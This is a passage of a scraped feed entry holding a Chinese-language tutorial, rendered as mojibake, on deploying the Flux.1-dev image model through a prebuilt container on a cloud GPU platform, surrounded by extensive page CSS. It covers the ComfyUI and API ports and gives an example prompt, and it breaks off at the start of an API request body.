</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®¹å™¨åŒ–éƒ¨ç½² Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›]]></title>    <link>https://juejin.cn/post/7589201772133040169</link>    <guid>https://juejin.cn/post/7589201772133040169</guid>    <pubDate>2025-12-30T01:56:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772133040169" data-draft-id="7589172193151057956" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®¹å™¨åŒ–éƒ¨ç½² Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LLM,å›¾ç‰‡èµ„æº"/> <meta itemprop="datePublished" content="2025-12-30T01:56:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®¹å™¨åŒ–éƒ¨ç½² Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T01:56:11.000Z" title="Tue Dec 30 2025 01:56:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2UqkYOrwwq5CgBjWpyGtxaonxe4KaJ3hx+7O0HaqVkxLBPj8FmBVmjNevIUFhUuDmMq5NDV9RwyPe/95IvxAhG7ymqxHGE5sZJL2kPLUhUinkXfrnFwGFwXD99djNLSFh/meXEb2B6Oyiwm0I7BC+OlTlOVPk9K8CIYzu5YHwKDTI6XAo5lz3WEqEXwQRKhh5cyLa6D81P4PXBw984as9YaGXHwx4Ba8rmOldUat/BHt9cQ38AaljnBdCJqs60OcXVDJZP//ZwSWtV9FpHNtgg22KuYx/U2tB5Mcp1TYOiphNhiFjgWeJ3DL2OZpuuUisIoUyzZEJ76I+LmyqWdv8LwnEiwMYczihjxeqtBsuFJSTg2oD1ETQx4v6D1VleSZW1xCwvAfVGWpQ069kgrQksAUW2rReYzsboIjSABuDQX0QJwB9cnZVgWVgE31vrklAJnEmVObykgYCk/VGX5OlpuKb5eiovUAvJ2tMstw0kIkNdpiSA91K6XA6K8CVCyr4PePhTo65q3DyX7OpTbSVk1PB62mhJ9HSpSqtKaESxsFRm0tLBVcvTV+vbBrLRK4hC7aitN9B0ZpX6vNMgjGIt5ZdmMv32KrmprD1afsPd4FEhThK0+WfTl3kpd482AGvG3jQdZK1+t8ireDswhofigRb3fxfI/4jj+xkffUX/1ccxxhEP9qyyBEH9Cx9vhf8TB7eiSpBHjZVSa4whQMJC1TqIR6q8RERtjOr2ID0yx3oYi0oAIvZCPz4eG64p3ObuREeOHUIR3MBVJwq9yll5P7KHdiPBOiOoRa/AjXz21J3k04l+i8OjErj4kaXWQiIVO/EvA+KLRAEnUVomtjPd6SvR3RLoeMT54nKFH1EqtkkEGFaQuTlSQrsxhRiOIt51S/Ho8B11+FUlwRaHnU4utEI38/mgSjRJ8PhWEtN6Z6WcncQOU4efjKoh3zfi7/+DfhPrwOZ9a/iYBiVJJxPlei3CqIDTYEqAPFow5/c71fAdVIwmo4n+cTIGbr2n9NULAE5ifcNNS63hvEOFk0wxYnICBBZ0I9xERBVILF0uggNdxuOkR4S6ngvgPmArzHv4KpMKGQFjQ+Rw6q9dC6R6dgZaJF7RVWIH0BTY9h+fz0ohHOyLuy+He/hN4GUR3/RxcBx2f76izarI9CaXmzRmhNQuSfIgJkva5GzN6HJbhQxCNsDGDSh56plmef6sg2eaXPsYBt5W+H6VE6omG6hOS1w4hiTWiThbJ1YO+RSO1vrpMlomf6nhQGz0m7qT6W04XOUHyzhZ4rkG+0hxL66oDW9mnPWyL3TMmssxyQUwr01CHX7b2OvUIaqS48TnMtAoEQTQixJeAlDfSiGmk/l8jpwIpTyFqOfeNIHWBooC036ERtUQp2tm/CKT5jjySbxTlvUVj2yhjvyWDVL3yfKRojXwLSEWUp7q0PBAKPp7m5YGoT3WH7wAZ1BeOywNZv3Gak/LIqriwxbQ5jaTcsEW1eb+FvoWo+zr5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸ºä»€ä¹ˆé€‰æ‹©Flux.1ï¼Ÿ</h2>
<p>ä½œä¸º2024å¹´æœ€å¼ºçš„å¼€æºæ–‡ç”Ÿå›¾æ¨¡å‹ï¼ŒFlux.1åœ¨æ–‡å­—æ¸²æŸ“ã€äººç‰©ç»†èŠ‚å’Œç”»é¢æ„å›¾ä¸Šå…¨é¢è¶…è¶ŠSDXLã€‚æœ€é‡è¦çš„æ˜¯ï¼Œç°åœ¨æœ‰ç°æˆçš„å®¹å™¨åŒ–æ–¹æ¡ˆï¼Œè®©ä½ è·³è¿‡ç¹ççš„ç¯å¢ƒé…ç½®ï¼Œä¸€é”®éƒ¨ç½²å³å¯ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-1">å‡†å¤‡å·¥ä½œï¼ˆ30ç§’ï¼‰</h2>
<p>ä»…éœ€ä¸¤æ ·ä¸œè¥¿ï¼š</p>
<ol>
<li>ä¸€ä¸ªå…±ç»©äº‘è´¦å·ï¼ˆæ–°ç”¨æˆ·æœ‰å…è´¹é¢åº¦ï¼‰</li>
<li>ä¼šå¤åˆ¶ç²˜è´´å°±è¡Œ</li>
</ol>
<h2 data-id="heading-2">éƒ¨ç½²æ­¥éª¤ï¼ˆ2åˆ†é’Ÿï¼‰</h2>
<h3 data-id="heading-3">ç¬¬1æ­¥ï¼šé€‰æ‹©é•œåƒ</h3>
<p>ç™»å½•å¹³å°åï¼Œåœ¨æœåŠ¡éƒ¨ç½²é¡µé¢æœç´¢"FluxEz"å®˜æ–¹é•œåƒã€‚è¿™ä¸ª42GBçš„é•œåƒå·²é›†æˆæ‰€æœ‰éœ€è¦çš„ç¯å¢ƒã€æ¨¡å‹æ–‡ä»¶å’ŒAPIæ¥å£ï¼Œæ— éœ€æ‰‹åŠ¨ä¸‹è½½ã€‚</p>
<blockquote>
<p><strong>å°è´´å£«</strong>ï¼šå¦‚æœæ˜¯é¦–æ¬¡æµ‹è¯•ï¼Œé€‰æ‹©å•å¡4090é…ç½®+1ä¸ªèŠ‚ç‚¹å°±å¤Ÿç”¨äº†ï¼Œæˆæœ¬å¯æ§ã€‚</p>
</blockquote>
<h3 data-id="heading-4">ç¬¬2æ­¥ï¼šé…ç½®å‚æ•°</h3>
<p>ç›´æ¥é‡‡ç”¨é»˜è®¤é…ç½®å³å¯ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ï¼š</p>
<ul>
<li>åˆ†é…GPUèµ„æº</li>
<li>è®¾ç½®ç«¯å£æ˜ å°„ï¼ˆWebUI:8188ï¼ŒAPI:3000ï¼‰</li>
<li>åŠ è½½Flux.1-devæ¨¡å‹å’Œå·¥ä½œæµ</li>
</ul>
<h3 data-id="heading-5">ç¬¬3æ­¥ï¼šç‚¹å‡»éƒ¨ç½²</h3>
<p>ç¡®è®¤é…ç½®æ— è¯¯åï¼Œç‚¹å‡»"éƒ¨ç½²æœåŠ¡"ã€‚è€å¿ƒç­‰å¾…1-2åˆ†é’Ÿï¼Œè®©èŠ‚ç‚¹æ‹‰å–é•œåƒå¹¶å¯åŠ¨ã€‚å½“çœ‹åˆ°çŠ¶æ€å˜ä¸º"è¿è¡Œä¸­"ï¼Œè¯´æ˜éƒ¨ç½²æˆåŠŸï¼</p>
<h3 data-id="heading-6">ç¬¬4æ­¥ï¼šè·å–è®¿é—®é“¾æ¥</h3>
<p>åœ¨ä»»åŠ¡è¯¦æƒ…é¡µæ‰¾åˆ°"å¿«é€Ÿè®¿é—®"åŒºåŸŸï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªå¯å…¬ç½‘è®¿é—®çš„åŸŸåã€‚ä½ ä¼šçœ‹åˆ°ä¸¤ä¸ªç«¯å£ï¼š</p>
<ul>
<li><strong>8188ç«¯å£</strong>ï¼šComfyUIå¯è§†åŒ–ç•Œé¢</li>
<li><strong>3000ç«¯å£</strong>ï¼šAPIæ¥å£åœ°å€</li>
</ul>
<h2 data-id="heading-7">ç«‹å³ä½¿ç”¨ï¼ˆ30ç§’ï¼‰</h2>
<h3 data-id="heading-8">æ–¹å¼ä¸€ï¼šWebUIç”Ÿæˆï¼ˆé€‚åˆæ–°æ‰‹ï¼‰</h3>
<ol>
<li>ç‚¹å‡»8188ç«¯å£é“¾æ¥è¿›å…¥ComfyUIç•Œé¢</li>
<li>å·¦ä¾§èœå•é€‰æ‹©"å·¥ä½œæµ"ï¼ŒåŠ è½½è‡ªå¸¦çš„<code>flux_dev_t5fp8.json</code></li>
<li>æ‰¾åˆ°"CLIPæ–‡æœ¬ç¼–ç "èŠ‚ç‚¹ï¼Œè¾“å…¥è‹±æ–‡æç¤ºè¯ï¼ˆFluxå¯¹è‹±æ–‡æ”¯æŒæ›´ä½³ï¼‰</li>
<li>ç‚¹å‡»"æ‰§è¡Œé˜Ÿåˆ—"ï¼Œç¨ç­‰ç‰‡åˆ»å³å¯åœ¨"ä¿å­˜å›¾åƒ"èŠ‚ç‚¹çœ‹åˆ°ç»“æœ</li>
</ol>
<p><strong>ç¤ºä¾‹æç¤ºè¯</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">best quality, a cute anime girl, sunshine, soft features, blue dress, <span class="hljs-type">long</span> hair, looking at viewer, smile
</code></pre>
<h3 data-id="heading-9">æ–¹å¼äºŒï¼šAPIè°ƒç”¨ï¼ˆé€‚åˆå¼€å‘ï¼‰</h3>
<p>æ›´é€‚åˆç”Ÿäº§ç¯å¢ƒçš„è°ƒç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># APIç«¯ç‚¹</span>
POST https://ä½ çš„åŸŸå/prompt

<span class="hljs-comment"># è¯·æ±‚ä½“ç»“æ„</span>
{
